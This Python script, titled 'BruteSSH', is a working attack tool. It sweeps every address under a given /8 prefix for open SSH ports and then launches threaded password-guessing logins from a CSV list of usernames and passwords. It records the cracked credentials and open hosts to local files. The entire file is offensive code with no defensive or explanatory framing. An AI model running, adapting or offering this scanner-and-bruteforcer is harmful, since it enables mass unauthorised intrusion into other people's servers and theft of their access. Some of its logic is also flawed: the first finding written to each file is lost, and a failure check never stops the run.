#!/usr/bin/python3
import pyfiglet
from pexpect import pxssh
from threading import *
from colorama import init, Fore
from random import randint
import time
import os
import csv
import argparse
import socket


init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

banner = pyfiglet.figlet_format("BruteSSH")
print(banner)

maxConnections = 12

connection_lock = BoundedSemaphore(value=maxConnections)
Fails = 0
global host, user, password

def connect(host, user, password, release):

    global Fails


    try:

        s = pxssh.pxssh()

        s.login(host, user, password)

        print(f'{RED}[+] Password Found: {user}@{host}:{password}{RESET}')
        
        if not os.path.exists('credentials.txt'):
            with open('credentials.txt', 'w'):
                pass
        else:
            with open('credentials.txt', 'a+') as f:
                f.write(f'{RED}{user}@{host}:{password}{RESET}\n')

    except Exception as e:
        
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)

    finally:

        if release: connection_lock.release()


def target():
    #for x in range(4):
    #    find_ip.append(str(randint(0, 255)))
    #host = '.'.join(find_ip)
    #time.sleep(2)
    parser = argparse.ArgumentParser(description='ex: ./SSHScanner.py -i 120 -f file.csv')
    parser.add_argument('-i', '--ip', type=str, required=True)
    parser.add_argument('-f', '--file', type=str, required=True)
    args = parser.parse_args()

    for x in range (1,256):
        for y in range (1,256):
            for w in range (1,256):
                host = (args.ip + '.' + str(x) + '.' + str(y) + '.' + str(w))   
                try:
                    s = socket.socket()
                    
                    s.settimeout(1)
        
                    s.connect((host, 22))
        
                    print(f'{RED}[+] IP {host} is Open Starting Brute Force{RESET}')
                    
                    if not os.path.exists('openIP.txt'):
                        with open('openIP.txt', 'w'):
                            pass
                    else:
                        with open('openIP.txt', 'a+') as f:
                            f.write(host+'\n')
                    
                    with open(args.file)as csv_file:
                        csv_reader = csv.reader(csv_file, delimiter=',')
                        for row in csv_reader:
                            user = row[0]
                            password = row[1]

                            if Fails > 5:
        
                                print(f"{RED}[!] Exiting: Too Many Socket Timeouts{RESET}")
        
                            connection_lock.acquire()
                            print(f"{GREEN}[*] Testing: {user}@{host}:{password}")
                            
                            t = Thread(target=connect, args=(host, user, password, True))
                            
                            t.start()
        
                except:
                    print(f'{BLUE}========================================================{RESET}')
                    print(f'{BLUE} [+] IP {host} PORT 22 Is Close{RESET}')
                    s.close()

if __name__ == '__main__':
    target()
